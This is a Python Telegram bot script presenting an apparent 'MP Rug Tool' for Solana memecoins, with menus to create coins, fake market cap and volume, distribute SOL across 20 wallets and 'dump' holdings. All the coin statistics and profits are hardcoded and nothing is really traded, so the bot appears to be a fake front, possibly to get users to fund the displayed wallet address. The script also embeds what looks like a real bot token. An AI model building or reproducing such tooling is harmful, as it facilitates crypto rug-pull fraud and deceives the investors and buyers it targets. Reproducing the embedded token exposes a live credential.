import telebot
from telebot import types
import requests

# Replace with your Telegram bot token
TOKEN = "7635910504:AAGmtfA54LrgeUFIG3JgCOeyJW6u2Xk4m-g"
bot = telebot.TeleBot(TOKEN)


# Coin data storage
coin_data = {
    "$SALT": {
        "name": "SALTMINECOIN",
        "link": "https://example.com/salt",
        "mc": "$79k",
        "liq": "$41k",
        "vol": "$183k",
        "holders": "442",
        "wallets": "33%",
        "profit": "$26,963 — 163.28 SOL"
    },
    "$BOK": {
        "name": "Let's BONK",
        "link": "https://example.com/bok",
        "mc": "$120k",
        "liq": "$65k",
        "vol": "$210k",
        "holders": "587",
        "wallets": "28%",
        "profit": "$18,452 — 112.75 SOL"
    },
    "$FWOG": {
        "name": "FWOG",
        "link": "https://example.com/fwog",
        "mc": "$95k",
        "liq": "$52k",
        "vol": "$195k",
        "holders": "512",
        "wallets": "31%",
        "profit": "$22,187 — 135.42 SOL"
    }
}

# Handle start command
@bot.message_handler(commands=['start'])
def start(message):
    # Step 1: Send the warning message and pin it
    warning_message = """
⚠️ WARNING: DO NOT CLICK on any ADs at the top of Telegram, they are NOT from us and most likely SCAMS.

Telegram now displays ADS in our bots without our approval. MP Rug Tool will NEVER advertise any links, airdrop claims, groups or discounts on fees.

For support, contact ONLY @cfomeme, Support Staff and Admins will never Direct Message first or call you!
"""
    pinned_message = bot.send_message(message.chat.id, warning_message)
    bot.pin_chat_message(message.chat.id, pinned_message.message_id)

    # Step 2: Send the contract info and balance message
    markup = types.InlineKeyboardMarkup()

    markup.row(
        types.InlineKeyboardButton("🪙 Create Coin", callback_data="create_coin"),
        types.InlineKeyboardButton("🗂️ Active Coins", callback_data="active_coins")
    )
    markup.row(
        types.InlineKeyboardButton("🏦 Withdraw", callback_data="withdraw"),
        types.InlineKeyboardButton("💰 Profits", callback_data="profits"),
        types.InlineKeyboardButton("🏆 Top Rugs", callback_data="top_rugs")
    )
    markup.row(
        types.InlineKeyboardButton("💣 Fake MC/Vol/LIq", callback_data="fakemc"),
        types.InlineKeyboardButton("📤 Gen/Dis SOL", callback_data="distribute")
    )
    markup.row(
        types.InlineKeyboardButton("⚙️ Help", callback_data="help"),
        types.InlineKeyboardButton("↻ Refresh", callback_data="refresh")
    )

    # Send contract info and balance message
    bot.send_message(
        message.chat.id,
        "Solana · 🅴\n<code>6YPGKaEHwtCiSWFRrMxAeMDi5c8qLNyMfCD3rJYhEhSc</code>  <i>(Tap to copy)</i>\nBalance:<code> 0 SOL ($0.00) </code>\n—\nClick on the Refresh button to update your current balance.",
        parse_mode='HTML',
        reply_markup=markup
    )

# Handle button clicks
# Active Coins Handler with hidden links
@bot.callback_query_handler(func=lambda call: call.data == 'active_coins')
def handle_active_coins(call):
    try:
        message_text = """
🚨 Active Coins List 🚨
''''''''''''''''''''''''''''''''''''''''''''''''''

• $SALT — SALTMINECOIN — <a href="{}">View</a>
• $BOK — Let's BONK — <a href="{}">View</a>
• $FWOG — FWOG — <a href="{}">View</a>

💬 To access any of these coins' menus, simply type the coin's $ symbol and hit send!
""".format(
    coin_data["$SALT"]["link"],
    coin_data["$BOK"]["link"],
    coin_data["$FWOG"]["link"]
)

        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("Back", callback_data="back_to_main"),
            types.InlineKeyboardButton("↻ Refresh", callback_data="active_coins")
        )
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=message_text,
            parse_mode='HTML',
            reply_markup=markup,
            disable_web_page_preview=True
        )
        bot.answer_callback_query(call.id)
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)}", show_alert=True)

# Handle coin symbol messages
@bot.message_handler(func=lambda message: message.text in ["$SALT", "$BOK", "$FWOG"])
def handle_coin_message(message):
    try:
        symbol = message.text
        coin = coin_data.get(symbol)
        
        if not coin:
            bot.reply_to(message, "Coin not found")
            return
            
        response_text = f"""
{symbol} - {coin['name']} {'🧂⛏️' if symbol == '$SALT' else '🦮' if symbol == '$BOK' else '🐸'}

💰 Market Cap (MC): {coin['mc']}
💦 Liquidity (LIQ): {coin['liq']}
📈 Volume (VOL): {coin['vol']}

👥 Holders: {coin['holders']}
👜 Your 20 wallets hold: {coin['wallets']}

🚀 Total Profit: {coin['profit']}
👉 Trade on pump.fun
"""
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("Slow dump", callback_data=f"slow_dump_{symbol[1:]}"),
            types.InlineKeyboardButton("Dump all", callback_data=f"dump_all_{symbol[1:]}"),
        )
        markup.row(
            types.InlineKeyboardButton("Back", callback_data="back_to_coins"),
            types.InlineKeyboardButton("↻ Refresh", callback_data=f"refresh_coin_{symbol[1:]}"),
        )
        
        bot.send_message(
            message.chat.id,
            response_text,
            parse_mode='HTML',
            reply_markup=markup
        )
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# Dump all confirmation
@bot.callback_query_handler(func=lambda call: call.data.startswith('dump_all_'))
def dump_all_confirmation(call):
    try:
        coin_symbol = f"${call.data.split('_')[2]}"
        coin = coin_data.get(coin_symbol)
        
        if not coin:
            bot.answer_callback_query(call.id, "Coin not found", show_alert=True)
            return
            
        confirm_text = f"""
Do you want to dump all your {coin_symbol} token from all 20 wallets?

Total Bought: $20
Total profit: {coin['profit']}
"""
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("NO", callback_data=f"coin_{call.data.split('_')[2]}"),
            types.InlineKeyboardButton("YES", callback_data=f"confirm_dump_{call.data.split('_')[2]}"),
        )
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=confirm_text,
            reply_markup=markup
        )
        bot.answer_callback_query(call.id)
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)}", show_alert=True)

# Handle dump confirmation
@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_dump_'))
def handle_dump_confirmation(call):
    try:
        coin_symbol = f"${call.data.split('_')[2]}"
        
        # Send success message
        bot.send_message(
            call.message.chat.id,
            f"Successfully sold all {coin_symbol} token."

        )
        
        # Send photo
        bot.send_photo(call.message.chat.id, "https://i.postimg.cc/TYsCqMyd/hqdefault.jpg")

        # Instead of calling handle_coin_message incorrectly, just tell user:
        bot.send_message(
            call.message.chat.id,
            f"You can type {coin_symbol} again to see its menu."
        )
        
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)}", show_alert=True)

# Back to Coins List Handler
@bot.callback_query_handler(func=lambda call: call.data == 'back_to_coins')
def back_to_coins(call):
    handle_active_coins(call)

# Back to Main Menu Handler (placeholder fix)
@bot.callback_query_handler(func=lambda call: call.data == 'back_to_main')
def back_to_main(call):
    bot.answer_callback_query(call.id, "Returning to main menu...")
    bot.send_message(call.message.chat.id, "You're back at the main menu!")

if __name__ == '__main__':
    print("Bot is running...")
    bot.infinity_polling()
